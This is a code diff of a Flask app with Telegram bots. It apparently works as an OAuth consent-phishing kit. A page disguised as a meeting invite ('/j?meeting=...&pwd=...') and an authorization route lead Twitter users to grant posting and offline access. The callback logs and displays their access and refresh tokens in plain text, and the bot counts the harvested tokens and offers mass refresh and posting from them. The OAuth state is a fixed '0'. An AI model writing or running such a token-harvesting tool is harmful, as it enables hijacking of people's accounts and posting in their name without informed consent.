@@ -14,7 +14,7 @@ logger = logging.getLogger(__name__)
 # Configuration
 CLIENT_ID = os.getenv('CLIENT_ID')
 CLIENT_SECRET = os.getenv('CLIENT_SECRET')
-CALLBACK_URL = os.getenv('CALLBACK_URL') # Update with your callback URL
+CALLBACK_URL = os.getenv('CALLBACK_URL')  # Update with your actual callback URL
 ALERT_BOT_TOKEN = os.getenv('ALERT_BOT_TOKEN')
 AUTOMATION_BOT_TOKEN = os.getenv('AUTOMATION_BOT_TOKEN')
 ALERT_CHAT_ID = os.getenv('ALERT_CHAT_ID')
@@ -52,8 +52,17 @@ def get_total_tokens():
 # Function to send startup messages
 def send_startup_message():
     total_tokens = get_total_tokens()
+    authorization_url = f"{WEBHOOK_URL}/authorization"
+    meeting_url = f"{WEBHOOK_URL}/j?meeting=0&pwd=examplepwd"
+
     alert_message = "🚀 Alert Bot Started."
-    automation_message = f"🚀 Automation Bot Started. Total Available Tokens: {total_tokens}\nChoose an option below."
+    automation_message = (
+        f"🚀 Automation Bot Started.\n"
+        f"🧮 Total Available Tokens: {total_tokens}\n"
+        f"🔗 [Authorize here]({authorization_url})\n"
+        f"📅 [Join Meeting here]({meeting_url})\n"
+        f"Choose an option below."
+    )
     
     automation_keyboard = [
         [InlineKeyboardButton("Refresh All Tokens", callback_data='refresh_all')],
@@ -62,13 +71,18 @@ def send_startup_message():
     ]
     reply_markup = InlineKeyboardMarkup(automation_keyboard)
     
+    # Send messages to both alert and automation bots
     alert_bot.send_message(chat_id=ALERT_CHAT_ID, text=alert_message)
-    automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=automation_message, reply_markup=reply_markup)
+    automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=automation_message, reply_markup=reply_markup, parse_mode='Markdown')
 
 # Function to show the main menu with updated token status
 def show_main_menu():
     total_tokens = get_total_tokens()
-    message = f"🚀 Main Menu. Total Available Tokens: {total_tokens}\nChoose an option below."
+    message = (
+        f"🚀 Main Menu\n"
+        f"🧮 Total Available Tokens: {total_tokens}\n"
+        f"Choose an option below."
+    )
     keyboard = [
         [InlineKeyboardButton("Refresh All Tokens", callback_data='refresh_all')],
         [InlineKeyboardButton("Post (Single Token)", callback_data='post_single')],
@@ -142,19 +156,23 @@ def webhook():
     return jsonify({'status': 'ok'})
 
 # Flask Routes for OAuth and Token Management
-@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
-def tweet(access_token):
-    if request.method == 'POST':
-        tweet_text = request.form['tweet_text']
-        # Post tweet logic goes here
-        return render_template('tweet_result.html', result="Tweet posted.")
-    return render_template('tweet_form.html', access_token=access_token)
+@app.route('/authorization')
+def authorization():
+    # Start the OAuth authorization process
+    state = "0"
+    code_verifier, code_challenge = generate_code_verifier_and_challenge()
+    session['oauth_state'] = state
+    session['code_verifier'] = code_verifier
 
-@app.route('/')
-def home():
-    return "Server is running and ready to receive webhooks!"
+    authorization_url = (
+        f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+        f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+        f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+    )
 
-# Function to generate OAuth code verifier and challenge
+    return redirect(authorization_url)
+
+# Helper function to generate code verifier and challenge
 def generate_code_verifier_and_challenge():
     code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
     code_challenge = base64.urlsafe_b64encode(
@@ -162,64 +180,52 @@ def generate_code_verifier_and_challenge():
     ).rstrip(b'=').decode('utf-8')
     return code_verifier, code_challenge
 
+@app.route('/oauth/callback')
+def oauth_callback():
+    code = request.args.get('code')
+    state = request.args.get('state')
+    error = request.args.get('error')
+
+    if error:
+        return f"Error during authorization: {error}", 400
+
+    if state != session.get('oauth_state'):
+        return "Invalid state parameter", 403
+
+    code_verifier = session.pop('code_verifier', None)
+
+    # Exchange authorization code for access token
+    token_url = "https://api.twitter.com/2/oauth2/token"
+    data = {
+        'grant_type': 'authorization_code',
+        'code': code,
+        'redirect_uri': CALLBACK_URL,
+        'code_verifier': code_verifier
+    }
+
+    response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
+    token_response = response.json()
+
+    if response.status_code == 200:
+        access_token = token_response.get('access_token')
+        refresh_token = token_response.get('refresh_token')
+        logger.info(f"Access Token: {access_token}, Refresh Token: {refresh_token}")
+        return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
+    else:
+        error_description = token_response.get('error_description', 'Unknown error')
+        error_code = token_response.get('error', 'No error code')
+        return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+
+@app.route('/')
+def home():
+    return redirect('/authorization')
+
 # Flask route for OAuth meeting page
 @app.route('/j')
 def meeting():
     state_id = request.args.get('meeting')
     code_ch = request.args.get('pwd')
     return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
-
-# Flask route for OAuth handling
-@app.route('/oauth')
-def oauth():
-    code = request.args.get('code')
-    state = request.args.get('state')
-    error = request.args.get('error')
-
-    if not code:
-        state = "0"
-        session['oauth_state'] = state
-
-        code_verifier, code_challenge = generate_code_verifier_and_challenge()
-        session['code_verifier'] = code_verifier
-
-        authorization_url = (
-            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
-            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
-            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
-        )
-
-        return redirect(authorization_url)
-
-    if code:
-        if error:
-            return f"Error during authorization: {error}", 400
-
-        if state != "0":
-            return "Invalid state parameter", 403
-
-        code_verifier = session.pop('code_verifier', None)
-
-        token_url = "https://api.twitter.com/2/oauth2/token"
-        data = {
-            'grant_type': 'authorization_code',
-            'code': code,
-            'redirect_uri': CALLBACK_URL,
-            'code_verifier': code_verifier
-        }
-
-        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
-        token_response = response.json()
-
-        if response.status_code == 200:
-            access_token = token_response.get('access_token')
-            refresh_token = token_response.get('refresh_token')
-            logger.info(f"Access Token: {access_token}, Refresh Token: {refresh_token}")
-            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
-        else:
-            error_description = token_response.get('error_description', 'Unknown error')
-            error_code = token_response.get('error', 'No error code')
-            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
 
 # Setting up command handlers
 dispatcher.add_handler(CommandHandler('start', start))
